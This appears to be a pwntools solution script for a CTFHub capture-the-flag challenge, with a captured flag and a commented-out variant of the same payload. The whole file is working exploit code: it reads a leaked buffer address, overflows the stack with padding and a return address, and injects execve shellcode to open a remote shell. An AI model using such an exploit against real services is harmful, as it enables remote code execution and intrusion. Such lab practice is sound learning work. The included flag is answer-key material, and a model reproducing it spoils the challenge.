from pwn import *
sh = remote("challenge-176e7afe53909329.sandbox.ctfhub.com", 31755)
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())
sh.recvuntil(b'[')
buf_addr = int(sh.recvuntil(b']', drop = True), 16)
shellcode_addr = buf_addr + 32
sh.recv()
print(hex(buf_addr))

payload = flat(b'a'*0x18, p64(shellcode_addr), shellcode)

sh.sendline(payload)
sh.interactive()

# ctfhub{2ccbb68c0dc6e37783627fd2}

# from pwn import *
# sh = remote("challenge-176e7afe53909329.sandbox.ctfhub.com", 31755)
# context.arch = 'amd64'
# shellcode = asm(shellcraft.sh())
# sh.recvuntil(b'[')
# buf_addr = int(sh.recvuntil(b']', drop = True), 16)
# shellcode_addr = buf_addr + 32
# sh.recv()
# print(hex(buf_addr))
# print(shellcode)

# payload = flat(shellcode.ljust(0x18, b'a'), p64(buf_addr))

# sh.sendline(payload)
# sh.interactive()
